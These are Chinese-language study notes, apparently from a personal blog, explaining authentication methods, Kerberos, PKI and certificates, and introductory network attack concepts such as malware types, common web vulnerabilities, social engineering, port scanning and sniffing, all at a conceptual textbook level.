<h4 id="认证信息类型"><a href="#认证信息类型" class="headerlink" title="认证信息类型"></a>认证信息类型</h4><p>常用的鉴别信息主要有四种：</p>
<p>（1）所知道的<strong>秘密</strong>，如用户口令、PIN (Personal Identification Number)。</p>
<p>（2）所拥有的<strong>实物</strong>，一般是不可伪造的设备，如智能卡、磁卡等。</p>
<p>（3）<strong>生物特征信息</strong>，如指纹、声音、视网膜等。</p>
<p>（4）上下文信息，就是认证实体所处的<strong>环境信息</strong>、地理位置、时间等，例如IP地址等。 </p>
<h4 id="认证方法分类"><a href="#认证方法分类" class="headerlink" title="认证方法分类"></a>认证方法分类</h4><ol>
<li><h5 id="单向认证"><a href="#单向认证" class="headerlink" title="单向认证"></a><strong>单向认证</strong></h5></li>
</ol>
<p> 单向认证是指在网络服务认证过程中，服务方对客户方进行单方面的鉴别，而客户方不需要识别服务方的身份（账号密码）。</p>
<p><strong>认证过程：</strong></p>
<p>第一步，客户方向服务器发出访问请求； </p>
<p>第二步，服务器要求客户方输入ID；</p>
<p>第三步，客户方向服务器输入ID；</p>
<p>第四步，服务器要求客户方输入密码；</p>
<p>第五步，客户方向服务器输入密码；</p>
<p>第六步，服务器验证ID和密码，如果匹配则允许客户进入系统访问。 </p>
<ol start="2">
<li><h5 id="双向认证"><a href="#双向认证" class="headerlink" title="双向认证"></a><strong>双向认证</strong></h5>双向认证是指在网络服务认证过程中，不仅服务方对客户方要进行鉴别，而且客户方也要鉴别服务方的身份。</li>
</ol>
<p><strong>认证过程：</strong></p>
<p>一到六步与单向的过程相同</p>
<p>第七步，客户提示服务器输入密码；</p>
<p>第八步，服务器按客户要求输入密码；</p>
<p>第九步，客户验证服务器。</p>
<ol start="3">
<li><p><strong>三方来实现。</strong></p>
<p>第三方不仅负责维护认证信息，而且还负责验证双方的身份。<strong>每个用户都把自己的ID和密码发送给可信第三方，由第三方负责认证过程</strong>。此方法兼顾了安全性和密码存储的简单易行性。</p>
</li>
</ol>
<h4 id="认证实现技术："><a href="#认证实现技术：" class="headerlink" title="认证实现技术："></a>认证实现技术：</h4><ol>
<li><p>静态密码: 用户的密码是由用户自己设定的(就是我们平时那个密码)</p>
</li>
<li><p>智能卡（IC卡）：一种内置集成电路的芯片，芯片中存有与用户身份相关的数据</p>
</li>
<li><p>短信密码：手机短信形式请求包含6位随机数的动态密码（安全、普及、易收费和维护）</p>
</li>
<li><p>动态口令牌：生成动态密码的终端</p>
</li>
<li><p>USB KEY：软硬件相结合、一次一密的强双因子认证模式</p>
</li>
<li><p>数字签名：数字签名又称电子加密，可以区分真实数据与伪造、被篡改过的数据</p>
</li>
<li><p>生物识别技术：通过可测量的身体或行为等生物特征进行身份认证的一种技术</p>
</li>
</ol>
<p> （身体特征包括：指纹、掌型、视网膜、虹膜、人体气味、脸型、手的血管和DNA等；）</p>
<p> （行为特征包括：签名、语音、行走步态等）</p>
<ol start="8">
<li><p>双因素身份认证：两种认证方法结合</p>
</li>
<li><p>身份的零知识证明：能够不传输这些信息身份进行认证的方法</p>
</li>
</ol>
<p>（ps: 目前部分学者将视网膜识别、虹膜识别和指纹识别等归为高级生物识别技术；将掌型识别、脸型识别、语音识别和签名识别等归为次级生物识别技术；将血管纹理识别、人体气味识别、DNA识别等归为“深奥的”生物识别技术）</p>
<h4 id="Kerberos技术"><a href="#Kerberos技术" class="headerlink" title="Kerberos技术"></a>Kerberos技术</h4><p>Kerberos的基本原理是<strong>利用对称密码技术</strong>，<strong>使用可信的第三方（刚刚的第三个方法）来认证</strong>服务器的用户身份，并在用户和服务器之间建立安全信道。(<strong>就是基于对称密码技术在网络上实施认证的一种服务协议，它允许一台工作站通过交换加密消息在非安全网络上与另一台工作站相互证明身份</strong>，一旦试图登录上网的用户身份得到验证，Kerberos协议就会给这两台工作站提供密钥，并通过使用密钥和加密算法为用户间的通信加密以进行安全的通信)</p>
<p>Kerberos系统涉及到</p>
<h5 id="四个基本实体："><a href="#四个基本实体：" class="headerlink" title="四个基本实体："></a><strong>四个基本实体：</strong></h5><ul>
<li>　　<strong>Kerberos客户机：</strong>用户用来访问服务器的设备。</li>
<li>　　<strong>AS</strong>(Authentication Server)：为用户分发TGT(Ticket Granting Ticket)的服务器。用户使用TGT(Ticket Granting Ticket)向TGS(Ticket Granting Server)证明自己的身份。</li>
<li>　　<strong>TGS</strong>(Ticket Granting Server)：为用户分发到最终目的票据的服务器，用户使用这个票据向自己要求提供服务的服务器证明自己的身份。</li>
<li>　　<strong>应用服务器</strong>(Application Server)：为用户提供特定服务。</li>
</ul>
<h5 id="设计基本思路："><a href="#设计基本思路：" class="headerlink" title="设计基本思路："></a><strong>设计基本思路：</strong></h5><p>①使用一个（或一组）独立的认证服务器（AS—Authentication Server），来为网络中的客户提供	身份认证服务；</p>
<p>②**认证服务器 (AS)**，用户口令由 AS 保存在数据库中；</p>
<p>③AS 与每个服务器共享一个唯一的保密密钥（已被安全分发）</p>
<p><img src="https://s2.loli.net/2024/11/10/OqAMisdtBW9N8H3.png" alt="4.png"></p>
<h5 id="设计目标："><a href="#设计目标：" class="headerlink" title="设计目标："></a><strong>设计目标：</strong></h5><p>①安全性：能够有效防止攻击者假扮成另一个合法的授权用户。</p>
<p>②可靠性：分布式服务器体系结构，提供相互备份。</p>
<p>③对用户透明性</p>
<p>④可伸缩：能够支持大数量的客户和服务器。</p>
<p>在实际使用中，会遇到如下问题：</p>
<p>①用户希望输入口令的次数最少。</p>
<p>②口令以明文传送会被窃听。</p>
<p>对于这样的问题，Kerberos的解决办法是：</p>
<p> ①票据重用（ticket reusable）。</p>
<p> ②引入票据许可服务器（TGS - ticket-granting server）。用于向用户分发服务器的访问票据；认证服务器 AS 并不直接向客户发放访问应用服务器的票据，而是由 TGS 服务器来向客户发放。</p>
<h5 id="票据："><a href="#票据：" class="headerlink" title="票据："></a><strong>票据：</strong></h5><p>在Kerberos系统中，<strong>票据</strong>(Ticket)是用于安全传递用户身份所需要的信息的集合。<strong>它不仅包含该用户的身份，而且还包含其他一些相关的信息。一般来说，它主要包括客户方Principal、目的服务方Principal、客户方IP地址、时间戳(分发该Ticket的时间)、Ticket的生存期以及会话密钥等内容。</strong>通常将AS和TGS统称为KDC(Key Distribution Center)。</p>
<p><img src="https://s2.loli.net/2024/11/10/Ym8TpQE9Mzi5Jt1.png" alt="2.png"></p>
<p><img src="https://s2.loli.net/2024/11/10/TNELxgQjFmk3pl4.png" alt="3.png"></p>
<h5 id="工作流程："><a href="#工作流程：" class="headerlink" title="工作流程："></a>工作流程：</h5><ul>
<li>第一步，<strong>Kerberos客户向认证服务器AS申请票据TGT。</strong></li>
<li>第二步，（AS在认证数据库检查、确认Kerberos客户，并产生一个会话密钥，同时使用Kerberos客户的秘密密钥对会话密钥进行加密，然后）<strong>生成一个票据TGT，AS生成TGT后，把TGT发送给Kerberos客户</strong></li>
<li>第三步，（Kerberos客户收到AS 发来的TGT后，使用自己的秘密密钥进行）解密，<strong>得到会话密钥，然后利用解密的信息重新构造认证请求单，向TGS发送请求，申请访问</strong>应用服务器AP所需要的<strong>票据</strong>(Ticket)。</li>
<li>第四步， TGS使用其秘密密钥<strong>对TGT进行解密</strong>，同时使用TGT中的会话密钥<strong>对</strong>Kerberos客户的<strong>请求认证单信息进行解密</strong>，并将解密后的认证单信息与TGT中的信息进行<strong>比较</strong>。然后，TGS生成新的会话密钥以供Kerberos客户和应用服务器使用，并利用各自的秘密密钥加密会话密钥。<strong>最后，生成一个票据</strong>，它由Kerberos客户实体名、地址、时间戳、限制时间、会话密钥组成。<strong>TGS生成TGT完毕后，把TGT发送给Kerberos客户。</strong></li>
<li>第五步，Kerberos客户收到TGS的响应后，将获得与应用服务器共享的会话密钥。与此同时，Kerberos客户生成一个新的用于访问应用服务器的认证单，并用与应用服务器共享的会话密钥加密，然后与TGS发送来的票据一并传送到应用服务器。</li>
<li>第六步，应用服务器确认请求。</li>
</ul>
<p><strong>优缺点</strong>：</p>
<p>主要优点是利用相对便宜的技术提供了较好的保护水平</p>
<p>缺点主要体现在以下3个方面：</p>
<p>  ① 需要具有很高利用率的可信在线认证服务器（至少在物理上是安全的）；</p>
<p>  ②重放检测依赖于时间戳，这意味着需要同步和安全的时钟；</p>
<p>  ③ 如果认证过程中的密钥受到威胁，那么传输在使用该密钥进行认证的任何会话过程中的所有被保护的数据都将受到威胁。</p>
<h2 id="五-PKI-技术"><a href="#五-PKI-技术" class="headerlink" title="五.PKI 技术"></a>五.PKI 技术</h2><h3 id="基本概念和作用："><a href="#基本概念和作用：" class="headerlink" title="基本概念和作用："></a>基本概念和作用：</h3><p>所谓PKI(Pubic Key Infrastructure)即公钥基础设施，<strong>支持公钥的管理，并提供保密性、完整性、真实性以及可追究性安全服务的具有普适性的安全基础设施</strong></p>
<ol>
<li>可提供安全服务</li>
<li>支持公钥的管理</li>
<li>利用公钥和其他加密技术的结合。</li>
</ol>
<h3 id="主要研究内容及主要服务"><a href="#主要研究内容及主要服务" class="headerlink" title="主要研究内容及主要服务"></a>主要研究内容及主要服务</h3><ul>
<li>其在计算机和网络环境中得到了广泛应用：如可信计算机的本机认证、网上证券、网上保险；网上办公、网上税务、网上工商、网上海关、网上医院等。</li>
</ul>
<h4 id="主要研究内容："><a href="#主要研究内容：" class="headerlink" title="主要研究内容："></a>主要研究内容：</h4><ul>
<li><p>PKI提供公钥加密和数字签名服务的系统或平台，目的是为了<strong>管理密钥和证书</strong>。通过数字证书，PKI很好的<strong>证明了公钥属于谁</strong>。</p>
</li>
<li><p>技术的研究对象包括：数字证书，颁发数字证书的证书认证中心（CA），持有证书的证书持有者和使用证书服务的证书用户等</p>
</li>
</ul>
<h4 id="主要安全服务："><a href="#主要安全服务：" class="headerlink" title="主要安全服务："></a>主要安全服务：</h4><p>1.<strong>认证</strong>——向一个实体确认另一个实体确实是他自己。</p>
<p>2.<strong>完整性</strong>—— 向一个实体确保数据没有被有意或无意的修改。</p>
<p>3.<strong>机密性</strong>——向一个实体确保除了接收者，无人能读懂数据的关键部分。</p>
<p>4.<strong>不可否认</strong>性——通过数字签名机制来提供该服务的。</p>
<h3 id="pkl的基本结构"><a href="#pkl的基本结构" class="headerlink" title="pkl的基本结构"></a>pkl的基本结构</h3><p><strong>PKI体系结构一般由认证机构和各种终端实体组成</strong><br>（pkl体系建立首先应该关注用户使用证书及相关服务的全面性和便利性）</p>
<p>建立和设计一个PKI体系必须保证</p>
<h4 id="相关服务功能的实现"><a href="#相关服务功能的实现" class="headerlink" title="相关服务功能的实现"></a><strong>相关服务功能的实现</strong></h4><p>• 用户身份的可信认证<br>• 制定完整的证书管理政策<br>• 建立高可信度的认证CA中心<br>• 用户实体属性的管理<br>• 用户身份的隐私保护<br>• 证书作废列表处理<br>• 认证机构CA为用户提供证书库及CRL服务的管理</p>
<h4 id="组成"><a href="#组成" class="headerlink" title="组成"></a><strong>组成</strong></h4><ol>
<li>Pkl策略</li>
<li>软硬件系统</li>
<li>证书机构ca</li>
<li>注册机构ca</li>
<li>证书发布系统</li>
<li>pkl应用</li>
</ol>
<h3 id="pkl与数字证书"><a href="#pkl与数字证书" class="headerlink" title="pkl与数字证书"></a>pkl与数字证书</h3><p><strong>数字证书是PKI最基本的元素</strong>，也是承载PKI安全服务的最重要的载体。 在PKI体系中,用户就是通过使用数字证书来保障信息的传输的保密性、发送信息的不<br>可否认性、交易者身份的确定性等安全特性。 数字证书是PKI的核心元素，由权威的、可信认的、公证的第三方机构CA所签发</p>
<h4 id="数字证书的补充"><a href="#数字证书的补充" class="headerlink" title="数字证书的补充"></a>数字证书的补充</h4><p>用户证书具有下列形式:<br>正在载入… CA《A》&#x3D;CA{V，SN，AI，CA，UCA，A，UA，Ap，TA}<br>这里:<br>V——证书版本号。<br>SN一—证书序列号。<br>AI——用于对证书进行签名的算法的标识符。<br>UCA——CA可选的惟一标识符。<br>UA——用户A可选的唯一标识符。</p>
<h4 id="数字证书-密钥的生命周期"><a href="#数字证书-密钥的生命周期" class="headerlink" title="数字证书&#x2F;密钥的生命周期"></a>数字证书&#x2F;密钥的生命周期</h4><p><strong>主要三个阶段：</strong></p>
<ul>
<li>证书初始化注册阶段</li>
<li>颁发投入工作阶段</li>
<li>撤消阶段</li>
</ul>
<p><img src="https://s2.loli.net/2024/11/10/joKpP4BzebIltRJ.png" alt="5.png"></p>
<h4 id="认证过程"><a href="#认证过程" class="headerlink" title="认证过程"></a>认证过程</h4><ol>
<li>证书拆封</li>
</ol>
<p>用于验证发行者ca的公钥能否正确解开客户实体——证书中的“发行者的数字签名”【即证明该证书是否为可信任的第三方ca机构所签发】<br>2. 序列号验证<br>检查实体证书中的签名实体序列号是否与签发者证书的序列号一致，从而验证证书真伪。<br>3. 有效期验证<br>检查用户证书使用的日期是否合法，有无过期。<br>4.撤销列表查询</p>
<h4 id="pkl互联"><a href="#pkl互联" class="headerlink" title="pkl互联"></a>pkl互联</h4><p>pkl互通性必须建立在网络互通的基础上</p>
<p><strong>PKI在全球互通可以有两种实现途径:</strong><br>● 各PKI体系的根CA交叉认证。（一般实现方式）<br>● 建立一个全球性的统一根CA，为各PKI体系的根证书颁发证书。（实现较困难）</p>
<h4 id="交叉互联"><a href="#交叉互联" class="headerlink" title="交叉互联"></a>交叉互联</h4><p>双子树结构<br><img src="https://s2.loli.net/2024/11/10/PpduB2AaFN54J6K.jpg" alt="6.jpg"></p>
<h3 id="pkl应用实例"><a href="#pkl应用实例" class="headerlink" title="pkl应用实例"></a>pkl应用实例</h3><h4 id="虚拟专用网络（VPN）"><a href="#虚拟专用网络（VPN）" class="headerlink" title="虚拟专用网络（VPN）"></a>虚拟专用网络（VPN）</h4><p><strong>定义</strong><br>  <strong>架构VPN的基础：基于pkl技术的IPSec协议</strong><br>  是一种架构在公用通信基础设 施上的专用数据通信网络，利用网络层安全协议(尤其是IPSec)和建立在PKI上 的加密与签名技术来获得私有性。<br>  <strong>口令</strong><br>  用来防止未授权的个人直接访问敏感数据<br>  <strong>防火墙</strong><br>  用来防止公司以外的未授权个人访问公司内部信息</p>
<p>  基于PKI技术的IPSec协议现在已经成为架构VPN 的基础，它可以为路由器之 间、防火墙之间或者路由器和防火墙之间提供经过加密和认证的通信。虽然它的 实现会复杂一些，但其安全性比其他协议都完善得多。<strong>由于IPSec是IP层上的协 议，因此很容易在全世界范围内形成一种规范，具有非常好的通用性，而且IPSec本身就支持面向未来的协议——IPv6</strong>。</p>
<h4 id="安全电子邮件——-PKI-与S-MIME"><a href="#安全电子邮件——-PKI-与S-MIME" class="headerlink" title="安全电子邮件—— PKI 与S&#x2F;MIME"></a>安全电子邮件—— PKI 与S&#x2F;MIME</h4><p><strong>利用数字证书和私钥，用户可以对他所发的邮件进行数字签名，这样就可以获得认证、完整性和不可否认性，</strong>如果证书是由其所属公司或某一可信第三方颁发的，收到邮件的人就可以信任该邮件的来源，无论他是否认识发邮件的人；另一方面，在政策和法律允许的情况下，用加密的方法就可以保障信息的保密性。</p>
<p>目前发展很快的安全电子邮件协议是S&#x2F;MIME ，是允许发送加密和有签名邮件的协议。主要依赖技术是pkl。</p>
<h4 id="Web安全——PKI-与-SSL"><a href="#Web安全——PKI-与-SSL" class="headerlink" title="Web安全——PKI 与 SSL"></a>Web安全——PKI 与 SSL</h4><p>无论是IE还是其他浏览器，都支持SSL协议（The Secure Sockets Layer）。这是一个在传输层和应用层之间的安全通信层，在两个实体进行通信之前，先要建立SSL连接，以此实现对应用层透明的安全通信。<strong>利用PKI技术，服务器和客户端都对对方的证书进行验证，同时客户端生成会话密钥和选择消息摘要算法，利用服务器端的公钥加密会话密钥，传送给服务器，这样SSL协议就允许在浏览器和服务器之间进行加密通信。</strong>SSL利用数字证书保证通信安全，服务器端和浏览器端分别由可信的第三方颁发数字证书，这样在交易时，双方可以通过数字证书确认对方的身份。需要注意的是，SSL协议本身并不能提供对不可否认性的支持，这部分的工作必须由数字证书完成。</p>
<p>结合SSL协议和数字证书，PKI技术可以保证Web 交易多方面的安全需求，使Web上的交易和面对面的交易一样安全。</p>
<h2 id="第六章-网络攻击与防御技术"><a href="#第六章-网络攻击与防御技术" class="headerlink" title="第六章 网络攻击与防御技术"></a><strong>第六章 网络攻击与防御技术</strong></h2><h3 id="6-1-攻击技术"><a href="#6-1-攻击技术" class="headerlink" title="6.1 攻击技术"></a>6.1 攻击技术</h3><h4 id="6-1-1-计算机病毒（或称恶意代码）"><a href="#6-1-1-计算机病毒（或称恶意代码）" class="headerlink" title="6.1.1 计算机病毒（或称恶意代码）"></a>6.1.1 计算机病毒（或称恶意代码）</h4><p>•计算机病毒是一种恶意软件，可以通过感染计算机系统并在其中复制自身来破坏计算机系统、窃取信息或进行其他恶意活动。</p>
<p>•计算机病毒通常通过网络、移动存储设备或恶意软件等途径传播，并且可能造成广泛的破坏和损失。</p>
<p>计算机病毒根据其传播方式、破坏方式和功能等不同特点，可以分为以下几类主要的分类：</p>
<ol>
<li>文件感染型病毒：病毒会感染可执行文件、程序或脚本文件，一旦这些文件运行，病毒就会开始感染系统中的其他文件</li>
<li>引导型病毒： 感染计算机的引导扇区后，在计算机启动时加载自身到内存中，使得计算机在启动时被感染</li>
<li>宏病毒：这种病毒主要利用应用程序中的宏功能，感染文档和模板文件，并在用户打开这些文件时执行恶意代码。</li>
<li>逻辑炸弹（Logic bombs）：逻辑炸弹是一种预设条件触发的恶意代码，可能在特定条件满足时触发破坏性行为。</li>
<li>蠕虫（Worm）：蠕虫是一种自我复制并通过网络传播的病毒，可以迅速在网络中传播并感染大量系统。</li>
<li>特洛伊木马（Trojan horse）：特洛伊木马是一种伪装成正常或有用程序，但实际上含有恶意代码的病毒，常常用于窃取信息、监视用户活动等恶意行为。</li>
<li>Rootkit：Rootkit是植入系统内核或应用程序中的一种恶意软件，目的是隐藏自身活动，绕过系统安全控制。</li>
<li>勒索软件（Ransomware）：勒索软件是一种加密文件然后勒索用户赎金的恶意软件，对用户和组织造成巨大损失。</li>
</ol>
<p>（遇到了再查解释。。）</p>
<p>计算机病毒发展趋势：</p>
<ol>
<li><p>AI和机器学习：恶意软件作者开始利用人工智能和机器学习技术来创建更具破坏性和隐匿性的病毒。这些病毒可能能够自我学习和适应防御系统的智能对抗。</p>
</li>
<li><p>指向性攻击：针对特定目标的高度定制化攻击越来越常见，这种攻击可能采用高级持续性威胁（Advanced Persistent Threat，APT）的形式，目的是窃取高价值信息或进行网络间谍活动。</p>
</li>
<li><p>IoT和移动设备攻击：随着物联网设备和移动设备的普及，计算机病毒也开始针对这些设备进行攻击，利用它们的弱点来入侵和控制目标系统。</p>
</li>
<li><p>加密货币挖矿病毒：近年来，加密货币挖矿病毒成为较为普遍的一种类型，这种病毒会利用感染的计算机资源来挖掘加密货币，占用系统性能和资源。</p>
</li>
<li><p>社交工程和钓鱼攻击：计算机病毒作者通过社交工程手段，如伪装成合法的电子邮件或网站，诱导用户点击链接或下载附件，从而传播恶意软件。</p>
</li>
</ol>
<p><strong>网络攻击</strong>一般采用三种技术手段，</p>
<ul>
<li><strong>一是利用计算机病毒（或称恶意代码）；</strong></li>
<li><strong>二是利用系统或者程序中的漏洞，或者协议漏洞；</strong></li>
<li><strong>三是利用社会工程学。</strong></li>
</ul>
<h4 id="6-1-2-漏洞的基本概念"><a href="#6-1-2-漏洞的基本概念" class="headerlink" title="6.1.2 漏洞的基本概念"></a>6.1.2 漏洞的基本概念</h4><p>•漏洞（Vulnerability）是指<strong>计算机系统或软件中存在的未被发现或未被修复的安全弱点</strong>，可以被黑客或恶意用户利用来进行攻击或入侵。漏洞可能导致系统崩溃、数据泄露、远程执行命令等安全问题，对系统和用户的信息安全构成威胁。许多安全漏洞是程序错误导致的，此时可叫做安全缺陷（Security bug），但并不是所有的安全隐患都是程序安全缺陷导致的。</p>
<p><strong>系统漏洞</strong></p>
<p>系统漏洞中目前最常见的是Web漏洞，它通常是指网络系统程序上的漏洞，可能是由于代码编写者在编写代码时考虑不周全等原因而造成的漏洞，<strong>常见的Web漏洞有Sql注入、XSS漏洞、上传漏洞等</strong>，具体分类如下：</p>
<p>•1. XSS（Cross-Site Scripting）跨站脚本，因为缩写和CSS重叠，所以只能叫XSS。跨站脚本是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种。</p>
<p>•2. SQL注入就是指Web应用程序对用户输入数据的合法性没有判断，前端传入后端的参数是攻击者可控的，并且参数代入数据库查询，攻击者可以通过在不同的SQL语句来实现对数据库的任意操作。</p>
<p>•3. CSRF（Cross-Site Request Forgery）为跨站请求伪造，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。CSRF通过伪装成受信任用户请求受信任的网站。CSRF难以防范，危险性比XSS更高。</p>
<p>•4. SSRF（Server-Side Request Forgery）为服务器端请求伪造，是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统。</p>
<p>•5. 文件上传漏洞是在上传文件时，如果服务器代码未对客户端上传的文件进行严格的验证和过滤，很容易造成可以上传任意文件的情况，包括上传脚本文件（asp、aspx、php、jsp等格式的文件）。非法用户可以利用上传的恶意脚本文件控制整个网站，甚至控制服务器。这个恶意的脚本文件，又被成为WebShell，也可将WebShell脚本称为一种网页后门，WebShell脚本具有非常强大的功能，比如查看服务器目录、服务器中的文件，执行系统命令等。</p>
<p>•6. 命令执行应用程序有时需要调用一些执行系统命令的函数，如在PHP中，使用system、exec、shell_exec、passthru、popen、proc_popen等函数可以执行系统命令。当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。</p>
<p>•7. 逻辑漏洞就是指攻击者利用业务的设计缺陷，获取敏感信息或破坏业务的完整性。一般出现在密码修改、越权访问、密码找回、交易支付金额等功能处。其中越权访问又分为水平越权和垂直越权。</p>
<h4 id="6-1-3-社会工程学"><a href="#6-1-3-社会工程学" class="headerlink" title="6.1.3 社会工程学"></a>6.1.3 社会工程学</h4><p><strong>社会工程学（攻击）是指在信息安全方面操纵人的心理，使其采取行动或泄露机密信息。有别于社会科学中的社会工程，这是种以收集信息、欺诈或入侵系统为目的的信任骗局，已发展出各种技术手段，并可能用于犯罪。</strong></p>
<p>各类型的网络犯罪和信息安全威胁，都会用社会工程学学的技巧，尤其是在<strong>目标式攻击</strong>中使用的频率愈来愈高。网络罪犯以往只会用世界杯足球赛或情人节等标题耸动的全球事件或新闻来引诱用户，现在有其他的犯罪手法往往也搭配使用社会工程学学技巧。</p>
<p>•钓鱼攻击：是一种企图从电子通信中，伪装成信誉卓著的法人媒体以获得用户名、密码和信用卡信息等敏感个人资料的犯罪诈骗过程。大多数的钓鱼攻击都是伪装成银行、学校、软件公司或政府安全机构等可信服务提供者，例如FBI。</p>
<p>•诱饵计划：在此类型的社会工程学阴谋中，攻击者利用了人们对于例如最新电影或者热门MV的超高关注，从而对这些人进行信息挖掘。这在例如Bit torrent等P2P分享网络中很常见。</p>
<p>•垃圾邮件：以电子邮件包装着恶意木马程序的电子邮件入侵受害者电脑，例如主旨为美国总统大选结果的电子邮件附件却包含恶意木马程序。</p>
<p>•电脑蠕虫：不需附在别的程序内，用户不介入操作的情况下也能自我复制或执行。</p>
<p>•恶意软件。</p>
<h3 id="6-2-信息收集"><a href="#6-2-信息收集" class="headerlink" title="6.2 信息收集"></a>6.2 信息收集</h3><h4 id="6-2-1-扫描技术"><a href="#6-2-1-扫描技术" class="headerlink" title="6.2.1 扫描技术"></a>6.2.1 扫描技术</h4><p><strong>扫描的目的</strong></p>
<p>主要有三个:</p>
<ul>
<li>查看目标网络中哪些主机是存活的</li>
<li>查看存活的主机运行了哪些服务</li>
<li>查看主机提供的服务有无漏洞</li>
</ul>
<h5 id="扫描的主要分类："><a href="#扫描的主要分类：" class="headerlink" title="扫描的主要分类："></a><strong>扫描的主要分类：</strong></h5><ul>
<li><h6 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h6></li>
</ul>
<p>​	IP扫描又叫Ping扫描，主要是通过使用系统自带工具Ping完成的</p>
<p>（基于ICMP协议，其主要思想就是构造一个ICMP包，发送给目的主机，从目的主机生成的响应来进行判断目标主机是否存活）</p>
<p><strong>Nmap</strong></p>
<p>Nmap是一个网络连接端口扫描软件，用来扫描目标网络主机的网络连接端口。确定哪些服务正在哪些端口上运行，从此推断运行在目标主机上的操作系统类型。它能很容易并相对较快的对目标地址空间进行ICMP Ping扫描。</p>
<p>Nmap的官方网址为<a href="https://nmap.org/">https://nmap.org/</a></p>
<ul>
<li><h6 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h6></li>
</ul>
<p>​	<strong>端口扫描可以分为TCP扫描和UDP扫描</strong></p>
<p>​	<strong>1. TCP端口扫描即三次握手</strong></p>
<p><img src="https://s2.loli.net/2024/11/10/nDifTvw7uHqh4rF.png" alt="7.png"></p>
<p>​	1.第一次握手：客户端向服务器发送报文段1，其中的 SYN 标志位 (前文已经介绍过各种标志位的作用)的值为 1，表示这是一个用于请求发起连接的报文段，其中的序号字段 (Sequence Number，图中简写为seq)被设置为初始序号x (Initial Sequence Number，ISN)，TCP 连接双方均可随机选择初始序号。发送完报文段1之后，客户端进入 SYN-SENT 状态，等待服务器的确认。</p>
<p>2.第二次握手：服务器在收到客户端的连接请求后，向客户端发送报文段2作为应答，其中 ACK 标志位设置为 1，表示对客户端做出应答，其确认序号字段 (Acknowledgment Number，图中简写为小写 ack) 生效，该字段值为 x + 1，也就是从客户端收到的报文段的序号加一，代表服务器期望下次收到客户端的数据的序号。此外，报文段2的 SYN 标志位也设置为1，代表这同时也是一个用于发起连接的报文段，序号 seq 设置为服务器初始序号y。发送完报文段2后，服务器进入 SYN-RECEIVED 状态。</p>
<p>3.第三次握手：客户端在收到报文段2后，向服务器发送报文段3，其 ACK 标志位为1，代表对服务器做出应答，确认序号字段 ack 为 y + 1，序号字段 seq 为 x + 1。此报文段发送完毕后，双方都进入 ESTABLISHED 状态，表示连接已建立。</p>
<p>•<strong>第一步</strong>：客户端进程发出断开连接指令，这将导致客户端的TCP程序创建一个特殊的TCP报文段，发送到服务器。这个报文段的FIN字段被置为1，表示这是一条断开连接的报文；</p>
<p>•<strong>第二步</strong>：服务器接收到客户端发来的断开连接报文，向客户端回送这个报文的确认报文（ACK字段为1），告诉服务器已经接收到FIN报文，并允许断开连接；</p>
<p>•<strong>第三步</strong>：服务器发送完确认报文后，服务器的TCP程序创建一条自己的断开连接报文，此报文的FIN字段被置为1，然后发往客户端；</p>
<p>•<strong>第四步</strong>：客户端接收到服务器发来的FIN报文段，则产生一条确认报文（ACK为1），发送给服务器，告知服务器已经接收到了它的断开报文。服务器接收到这条ACK报文段后，释放TCP连接相关的资源（缓存和变量），而<strong>客户端等待一段时间后</strong>（半分钟、一分钟或两分钟），也释放处于客户端的缓存和变量；</p>
<p>•<strong>ACK</strong>：只有1 bit的标志位，若为1，表示这个数据段中的确认序号是有效的，即这个数据报是对之前接收到的某个报文的确认（一个TCP报文可以同时作为确认报文和传递数据报文）。</p>
<p>•<strong>RST</strong>：只有1 bit的标志位，若客户端向服务器的一个端口请求建立TCP连接，但是服务器的那个端口并不允许建立连接（比如没开启此端口），则服务器会回送一个TCP报文，将RST位置为1，告诉客户端不要再向这个端口发起连接；</p>
<p>•<strong>SYN</strong>：只有1 bit的标志位，若为1，表示这是一条建立连接的TCP报文段；</p>
<p>•<strong>FIN</strong>：只有1 bit的标志位，若为1，表示这是一条断开连接的TCP报文段；</p>
<p><strong>UDP扫描</strong></p>
<ul>
<li><p>UDP扫描发送空的(没有数据)UDP报头到每个目标端口。 如果返回ICMP端口不可到达错误(类型3，代码3)， 该端口是closed(关闭的)。 其它ICMP不可到达错误(类型3， 代码1，2，9，10，或者13)表明该端口是filtered(被过滤的)。 偶尔地，某服务会响应一个UDP报文，证明该端口是open(开放的)。 如果几次重试后还没有响应，该端口就被认为是 open|filtered(开放|被过滤的)。 这意味着该端口可能是开放的，也可能包过滤器正在封锁通信。 可以用版本扫描(-sV)帮助区分真正的开放端口和被过滤的端口。</p>
</li>
<li><p>使用特定的 UDP服务客户端（如 Snmpwalk，dig或Tftp）发送UDP数据包到目标UDP网络服务之后等待确定性的响应信息。</p>
</li>
<li><h6 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h6></li>
</ul>
<p>​	漏洞扫描程序的基本原理：具有漏洞的应用程序在对某些网络请求作答时，与已经安装补丁的程序有所差别；利用这些差别可以识别目标主机上的程序是否存在漏洞。</p>
<p>​	常用的漏洞扫描工具有Nessus、OpenVAS、X-Scan等</p>
<h4 id="6-2-2-嗅探技术"><a href="#6-2-2-嗅探技术" class="headerlink" title="6.2.2 嗅探技术"></a>6.2.2 嗅探技术</h4><p>对攻击者来说，通过嗅探技术能以非常隐蔽的方式攫取网络中的大量敏感信息，<strong>与主动扫描相比，嗅探行为更难被察觉，也更容易操作</strong></p>
<h5 id="嗅探器的作用"><a href="#嗅探器的作用" class="headerlink" title="嗅探器的作用"></a>嗅探器的作用</h5><p><strong>不正当用途</strong>：</p>
<p> (1) 窃取机密信息，包括各种用户名和口令，电子邮件正文及附件、网络打印的文档等；</p>
<p> (2) 窥探底层的协议信息，如DNS的IP地址、本机IP地址、网关IP地址等；</p>
<p> (3) 通过嗅探器获得的数据还可以为攻击者进行中间人攻击篡改数据提供帮助。</p>
<p><strong>正当用途</strong>：</p>
<p> (1) 解释网络上传输的数据包的含义；</p>
<p> (2) 为网络诊断提供参考；</p>
<p> (3) 为网络性能分析提供参考；</p>
<p> (4) 发现网络入侵现象，为入侵检测提供参考；</p>
<p> (5) 将网络事件记入日志。</p>
